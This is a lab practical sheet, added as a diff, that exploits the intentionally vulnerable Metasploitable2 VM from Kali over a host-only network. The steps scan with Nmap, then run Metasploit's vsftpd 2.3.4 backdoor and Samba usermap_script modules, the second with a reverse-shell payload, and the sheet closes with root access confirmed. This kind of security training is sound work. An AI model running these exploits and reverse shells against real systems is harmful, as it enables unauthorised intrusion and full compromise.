@@ -1,0 +1,185 @@
+============================================================
+PRACTICAL — METASPLOIT & METASPLOITABLE2
+============================================================
+
+STEP 1 — Configure VMware
+- Set both VMs to:
+  Host-Only Network
+- Metasploitable2:
+  Disable Network Adapter 2
+- Start both VMs
+
+------------------------------------------------------------
+
+STEP 2 — Get Metasploitable2 IP
+Login:
+Username: msfadmin
+Password: msfadmin
+
+Run:
+
+ifconfig
+
+Note IP under:
+eth0
+
+------------------------------------------------------------
+
+STEP 3 — Get Kali IP
+
+ip a
+
+Note IP under:
+eth0
+
+------------------------------------------------------------
+
+STEP 4 — Test Connectivity
+
+ping 192.168.xx.xx
+
+(Target = Metasploitable2 IP)
+
+Stop using:
+CTRL + C
+
+------------------------------------------------------------
+
+STEP 5 — Scan Target Using Nmap
+
+nmap -sV 192.168.xx.xx
+
+Observe important ports:
+- 21 FTP
+- 22 SSH
+- 80 HTTP
+- 445 Samba
+
+------------------------------------------------------------
+
+STEP 6 — Start Metasploit
+
+msfconsole
+
+Wait for:
+msf6 >
+
+------------------------------------------------------------
+
+STEP 7 — Search vsftpd Exploit
+
+search vsftpd
+
+------------------------------------------------------------
+
+STEP 8 — Load vsftpd Exploit
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+------------------------------------------------------------
+
+STEP 9 — View Options
+
+show options
+
+------------------------------------------------------------
+
+STEP 10 — Set Target IP
+
+set RHOSTS 192.168.xx.xx
+
+------------------------------------------------------------
+
+STEP 11 — Set Kali IP
+
+set LHOST 192.168.xx.xx
+
+------------------------------------------------------------
+
+STEP 12 — Set Payload
+
+set payload cmd/unix/interact
+
+------------------------------------------------------------
+
+STEP 13 — Run Exploit
+
+run
+
+------------------------------------------------------------
+
+STEP 14 — Verify Access
+
+getuid
+
+sysinfo
+
+pwd
+
+ls
+
+------------------------------------------------------------
+
+STEP 15 — Background Session
+
+background
+
+------------------------------------------------------------
+
+STEP 16 — Load Samba Exploit
+
+use exploit/multi/samba/usermap_script
+
+------------------------------------------------------------
+
+STEP 17 — Set Target IP
+
+set RHOSTS 192.168.xx.xx
+
+------------------------------------------------------------
+
+STEP 18 — Set Kali IP
+
+set LHOST 192.168.xx.xx
+
+------------------------------------------------------------
+
+STEP 19 — Set Payload
+
+set payload cmd/unix/reverse
+
+------------------------------------------------------------
+
+STEP 20 — Run Samba Exploit
+
+run
+
+------------------------------------------------------------
+
+STEP 21 — Verify Root Access
+
+whoami
+
+id
+
+hostname
+
+------------------------------------------------------------
+
+STEP 22 — Exit Shell
+
+exit
+
+============================================================
+RESULT
+============================================================
+
+1. Network connectivity verified
+2. Target scanned using Nmap
+3. vsftpd 2.3.4 vulnerability exploited
+4. Samba usermap_script vulnerability exploited
+5. Root access gained successfully
+
+============================================================
+END
+============================================================
